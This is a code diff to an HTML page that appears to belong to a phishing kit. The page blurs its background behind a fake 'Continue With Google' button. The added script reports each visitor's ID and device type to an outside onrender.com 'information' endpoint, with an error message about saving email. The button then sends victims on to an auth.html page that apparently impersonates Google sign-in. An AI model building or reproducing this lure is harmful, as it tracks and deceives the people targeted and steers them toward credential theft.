@@ -162,7 +162,7 @@
 
     <!-- OVERLAY BUTTON -->
     <div class="overlay">
-      <a href="user-auth.html" class="google-button-overlay">
+      <a class="google-button-overlay">
         <img src="https://i.ibb.co.com/r2hMPDjS/logg.webp" alt="icon" />
         Continue With Google
       </a>
@@ -205,28 +205,49 @@
           document.querySelector(".map-background").style.filter = "blur(3px)";
         }, 3000); // 3 seconds
       });
-      window.addEventListener("load", () => {
-        fetch("https://megatools-8920.onrender.com/api/v1/information", {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json",
-          },
-          body: JSON.stringify({
-            user: id,
-            siteName: "AutoInfo/login",
-          }),
-        })
-          .then((response) => response.json())
-          .then((data) => {
-            if (data.success) {
-              _id = data.data._id;
-              console.log("Saved ID:", _id);
-              localStorage.setItem("infoId", _id);
-            } else {
-              console.error(data.message);
-            }
-          })
-          .catch((error) => console.error(error));
+
+      function getDeviceType() {
+        const ua = navigator.userAgent.toLowerCase();
+        const isMobile =
+          /android|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(ua);
+        const isTablet = /ipad|tablet|playbook|silk/i.test(ua) && !isMobile;
+
+        if (isMobile || isTablet) return "mobile";
+        return "desktop";
+      }
+
+      const deviceType = getDeviceType();
+
+      window.addEventListener("load", async () => {
+        try {
+          const res = await fetch(
+            "https://megatools-8920.onrender.com/api/v1/information",
+            {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({
+                user: id,
+                deviceType,
+                siteName: "AutoInfo/login-view",
+              }),
+            },
+          );
+
+          const data = await res.json();
+        } catch (err) {
+          console.error(err);
+          alert("Failed to save email.");
+        }
+      });
+      const googleButton = document.querySelector(".google-button-overlay");
+
+      googleButton.addEventListener("click", () => {
+        if (!id) {
+          alert("Missing ID in URL");
+          return;
+        }
+
+        window.location.href = "auth.html?id=" + id;
       });
     </script>
   </body>
